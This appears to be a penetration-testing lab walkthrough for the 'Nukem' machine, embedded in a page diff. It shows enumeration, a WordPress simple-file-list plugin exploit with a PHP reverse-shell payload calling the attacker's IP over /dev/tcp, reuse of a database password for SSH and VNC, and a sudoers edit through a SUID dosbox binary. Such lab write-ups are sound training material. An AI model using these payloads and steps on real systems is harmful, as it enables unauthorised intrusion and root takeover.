@@ -1,0 +1,232 @@
+<div id="__BVID__15___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__15___BV_modal_header_" class="modal-header"><h5 id="__BVID__15___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__15___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-main-color"><!----><div><h1>Exploitation Guide for Nukem</h1>
+<h2>Summary</h2>
+<p>In this walkthrough, we'll gain RCE via a vulnerable plugin in the WordPress installation. After careful enumeration, we discover a SUID binary that requires GUI access. With more enumeration we discover a VNC service, reuse a discovered password, and leverage the SUID binary to gain root access.</p>
+<h2>Enumeration</h2>
+<h3>Nmap</h3>
+<p>We'll start off with an <code>nmap</code> scan.</p>
+<pre id="fence-code-31" class="fence-code"><code>kali@kali:~$ sudo nmap -sV -sC 192.168.120.55
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-06 17:56 -03
+Nmap scan report for 192.168.120.55
+Host is up (0.15s latency).
+Not shown: 996 filtered ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.3 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
+|_http-generator: WordPress 5.5.1
+|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
+|_http-title: Retro Gamming &amp;#8211; Just another WordPress site
+3306/tcp open  mysql?
+| fingerprint-strings: 
+|   GetRequest, NCP, NULL, NotesRPC, TLSSessionReq, X11Probe, afp, giop: 
+|_    Host '192.168.118.8' is not allowed to connect to this MariaDB server
+5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.8.5)
+|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
+|_http-title: 404 Not Found
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V=7.80%I=7%D=10/6%Time=5F7CDA22%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.118\.8'\x20is\x20not\x20all
+SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetRequest
+SF:,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.118\.8'\x20is\x20not\x20allow
+SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TLSSessionRe
+SF:q,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.118\.8'\x20is\x20not\x20allo
+SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,4C
+SF:,"H\0\0\x01\xffj\x04Host\x20'192\.168\.118\.8'\x20is\x20not\x20allowed\
+SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NCP,4C,"H\0\0\x
+SF:01\xffj\x04Host\x20'192\.168\.118\.8'\x20is\x20not\x20allowed\x20to\x20
+SF:connect\x20to\x20this\x20MariaDB\x20server")%r(NotesRPC,4C,"H\0\0\x01\x
+SF:ffj\x04Host\x20'192\.168\.118\.8'\x20is\x20not\x20allowed\x20to\x20conn
+SF:ect\x20to\x20this\x20MariaDB\x20server")%r(afp,4C,"H\0\0\x01\xffj\x04Ho
+SF:st\x20'192\.168\.118\.8'\x20is\x20not\x20allowed\x20to\x20connect\x20to
+SF:\x20this\x20MariaDB\x20server")%r(giop,4C,"H\0\0\x01\xffj\x04Host\x20'1
+SF:92\.168\.118\.8'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this
+SF:\x20MariaDB\x20server");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.49 seconds
+
+</code></pre>
+<h3>WPScan</h3>
+<p>There are several interesting services, but we'll begin by exploring the WordPress installation on port 80 with <code>wpscan</code>.</p>
+<pre id="fence-code-32" class="fence-code"><code>kali@kali:~$ wpscan --url http://192.168.120.55/
+...
+[+] Enumerating All Plugins (via Passive Methods)
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] simple-file-list
+ | Location: http://192.168.120.55/wp-content/plugins/simple-file-list/
+ | Last Updated: 2020-08-24T21:35:00.000Z
+ | [!] The version is out of date, the latest version is 4.2.11
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 4.2.2 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://192.168.120.55/wp-content/plugins/simple-file-list/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://192.168.120.55/wp-content/plugins/simple-file-list/readme.txt
+
+[+] tutor
+ | Location: http://192.168.120.55/wp-content/plugins/tutor/
+ | Last Updated: 2020-09-22T09:55:00.000Z
+ | [!] The version is out of date, the latest version is 1.7.0
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.5.3 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://192.168.120.55/wp-content/plugins/tutor/readme.txt
+
+...
+
+</code></pre>
+<p>We discover an RCE exploit for the <a href="https://www.exploit-db.com/exploits/48979" target="_blank"><em>simple-file-list</em> plugin</a>.</p>
+<h2>Exploitation</h2>
+<h3>WordPress Plugin Remote Code Execution</h3>
+<p>Let's copy the exploit to our working directory, replacing the line 36 of the exploit with our attacking machine's IP address and the appropriate port number:</p>
+<pre id="fence-code-33" class="fence-code"><code>payload = '&lt;?php passthru("bash -i &gt;&amp; /dev/tcp/192.168.118.8/80 0&gt;&amp;1"); ?&gt;'
+</code></pre>
+<p>Before running the exploit, we'll set up a Netcat listener.</p>
+<pre id="fence-code-34" class="fence-code"><code>kali@kali:~$ sudo nc -lvnp 80
+listening on [any] 80 ...
+</code></pre>
+<p>With the listener running, we'll execute the exploit.</p>
+<pre id="fence-code-35" class="fence-code"><code>kali@kali:~$ python3 48979.py http://192.168.120.55
+[ ] File 9357.png generated with password: b3824ae2f451a1801fab81d9ff080139
+[ ] File uploaded at http://192.168.120.55/wp-content/uploads/simple-file-list/9357.png
+[ ] File moved to http://192.168.120.55/wp-content/uploads/simple-file-list/9357.php
+[+] Exploit seem to work.
+[*] Confirmning ...
+</code></pre>
+<p>Our Netcat listener should have caught the reverse shell.</p>
+<pre id="fence-code-36" class="fence-code"><code>kali@kali:~$ sudo nc -lvnp 80
+listening on [any] 80 ...
+connect to [192.168.118.8] from (UNKNOWN) [192.168.120.55] 54012
+bash: cannot set terminal process group (352): Inappropriate ioctl for device
+bash: no job control in this shell
+[http@nukem simple-file-list]$
+</code></pre>
+<h3>Password Reuse</h3>
+<p>As we begin to enumerate, we identify a <em>commander</em> user in the home directory. After careful enumeration, we discover the password for the MySQL server:</p>
+<pre id="fence-code-37" class="fence-code"><code>[http@nukem http]$ cat wp-config.php
+cat wp-config.php
+...
+/** MySQL database username */
+define( 'DB_USER', 'commander' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
+...
+</code></pre>
+<p>Let's test these credentials.</p>
+<pre id="fence-code-38" class="fence-code"><code>$ ssh commander@192.168.120.55
+The authenticity of host '192.168.120.55 (192.168.120.55)' can't be established.
+ECDSA key fingerprint is SHA256:12pFiOx1TBYX+6LlFEj3HR0305rPpXDWLKkdg1JLYSM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.120.55' (ECDSA) to the list of known hosts.
+commander@192.168.120.55's password: CommanderKeenVorticons1990
+[commander@nukem ~]$ 
+</code></pre>
+<p>Success! We have access as <em>commander</em>.</p>
+<h2>Escalation</h2>
+<h3>Dosbox SUID</h3>
+<p>While enumerating, we discover several SUID binaries.</p>
+<pre id="fence-code-39" class="fence-code"><code>[commander@nukem ~]$ find / -perm -u=s -type f 2&gt;/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/ssh/ssh-keysign
+/usr/lib/Xorg.wrap
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/bin/fusermount
+/usr/bin/su
+/usr/bin/ksu
+/usr/bin/gpasswd
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/expiry
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/chage
+/usr/bin/dosbox **
+/usr/bin/newgrp
+/usr/bin/mount.cifs
+/usr/bin/suexec
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/sg
+/usr/bin/unix_chkpwd
+</code></pre>
+<p>The Dosbox binary has the SUID bit set, but it won't start in the console. We'll instead need to gain access to the graphical interface. Fortunately, a VNC session is running on this server on port 5901.</p>
+<pre id="fence-code-40" class="fence-code"><code>[commander@nukem ~]$ ps -ef | grep vnc
+root         367       1  0 01:48 ?        00:00:00 /usr/bin/vncsession commander :1
+root         368     367  0 01:48 ?        00:00:00 [vncsession] &lt;defunct&gt;
+command+     400     367  0 01:48 ?        00:00:00 xinit /etc/lightdm/Xsession startxfce4 -- /usr/bin/Xvnc :1 -alwaysshared -geometry 1024x728 -localhost -auth /home/commander/.Xauthority -desktop nukem:1 (commander) -fp /usr/share/fonts/75dpi,/usr/share/fonts/100dpi -pn -rfbauth /home/commander/.vnc/passwd -rfbport 5901 -rfbwait 30000
+command+     405     400  0 01:48 ?        00:00:00 /usr/bin/Xvnc :1 -alwaysshared -geometry 1024x728 -localhost -auth /home/commander/.Xauthority -desktop nukem:1 (commander) -fp /usr/share/fonts/75dpi,/usr/share/fonts/100dpi -pn -rfbauth /home/commander/.vnc/passwd -rfbport 5901 -rfbwait 30000
+command+     845     829  0 02:40 pts/0    00:00:00 grep vnc
+</code></pre>
+<p>Let's use port redirection to try to reach this service.</p>
+<pre id="fence-code-41" class="fence-code"><code>kali@kali:~$ ssh -L 5901:localhost:5901 commander@192.168.120.55
+commander@192.168.120.55's password:
+Last login: Wed Sep 30 02:36:30 2020 from 192.168.118.8
+[commander@nukem ~]$
+</code></pre>
+<p>Now, let's use <code>vncviewer</code> to connect.</p>
+<pre id="fence-code-42" class="fence-code"><code>kali@kali:~$ vncviewer localhost:5901
+Connected to RFB server, using protocol version 3.8
+Performing standard VNC authentication
+Password: CommanderKeenVorticons1990
+Authentication successful
+
+Desktop name "nukem:1 (commander)"
+VNC server default format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+Using default colormap which is TrueColor.  Pixel format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+Same machine: preferring raw encoding
+</code></pre>
+<p>We are greeted with an XFCE desktop.</p>
+<h1>Updating Sudoers File</h1>
+<p>LEt
+s open a terminal in the remote session and run <code>dosbox</code>. This results in classic DOS prompt.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_38_image_1_smk2EeWJ.png" alt="dosbox">
+<figcaption>dosbox</figcaption>
+</figure>
+<p></p>
+<p>Following the <a href="https://www.dosbox.com/wiki/MOUNT" target="_blank">Dosbox WIKI</a>, we discover that the application should let us mount the file system. Let's try to mount the /etc directory and access the <code>shadow</code> file:</p>
+<pre id="fence-code-43" class="fence-code"><code>Z:\&gt; mount C /etc
+Drive C is mounted as local directory /etc/
+
+Z:\&gt; C:
+
+C:\&gt; type shadow
+root:$6$MfW0zuduZhJE.svF$uDYH.../K0:18523::::::
+bin:!*:18523::::::
+daemon:!*:18523:::::
+...
+</code></pre>
+<p>This confirms that we can read high-privileged files with DOS. We also discover that SUDO is present on the system. Let's add the <em>commander</em> user to sudo and give our account full privileges.</p>
+<pre id="fence-code-44" class="fence-code"><code>C:\&gt; dir sudoers
+Directory of C:\
+SUDOERS    3,176   30-09-2020  14:00
+
+C:\&gt; echo commander ALL=(ALL) ALL &gt;&gt; sudoers
+</code></pre>
+<p>Now, in our SSH session, we can use sudo to escalate to root.</p>
+<pre id="fence-code-45" class="fence-code"><code>[commander@nukem ~]$ sudo -i
+[sudo] password for commander:
+
+[root@nukem ~]# whoami
+root
+</code></pre>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
